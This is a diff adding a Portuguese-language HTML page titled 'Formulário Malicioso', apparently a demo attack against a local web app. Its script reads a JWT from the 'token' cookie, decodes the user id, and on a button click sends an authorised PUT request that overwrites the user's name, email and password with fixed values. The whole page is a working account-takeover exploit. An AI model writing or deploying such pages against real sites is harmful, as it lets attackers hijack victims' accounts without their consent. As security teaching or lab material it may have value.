@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <title>Formulário Malicioso</title>
+    <script src="https://cdn.jsdelivr.net/npm/jwt-decode/build/jwt-decode.min.js"></script>
+</head>
+<body>
+    <h1>Formulário Malicioso</h1>
+    <button id="attackButton">Atualizar Dados do Usuário</button>
+
+    <script>
+        // Função para obter o valor de um cookie pelo nome
+        const getCookie = (name) => {
+            const value = `; ${document.cookie}`;
+            const parts = value.split(`; ${name}=`);
+            if (parts.length === 2) return parts.pop().split(';').shift();
+        };
+
+        document.getElementById('attackButton').addEventListener('click', async () => {
+            const token = getCookie('token'); // Obtém o token do cookie
+
+            // Verifica se o token foi encontrado
+            if (!token) {
+                console.error('Token JWT não encontrado no cookie.');
+                return;
+            }
+
+            // Decodifica o token JWT
+            const decodedToken = jwt_decode(token);
+            console.log('Token decodificado:', decodedToken);
+
+            const formData = {
+                name: 'Novo Nome',
+                email: 'novoemail@example.com',
+                password: 'novaSenha123'
+            };
+
+            try {
+                const response = await fetch(`http://localhost:3000/api/users/${decodedToken.id}`, {
+                    method: 'PUT',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': `Bearer ${token}` // Usa o token do cookie
+                    },
+                    body: JSON.stringify(formData)
+                });
+
+                if (response.ok) {
+                    console.log('Dados do usuário atualizados com sucesso!');
+                } else {
+                    console.error('Erro ao atualizar dados do usuário:', response.statusText);
+                }
+            } catch (error) {
+                console.error('Erro ao enviar a requisição:', error);
+            }
+        });
+    </script>
+
+    <p>Se você clicar no botão acima, isso tentará atualizar os dados do usuário.</p>
+</body>
+</html>
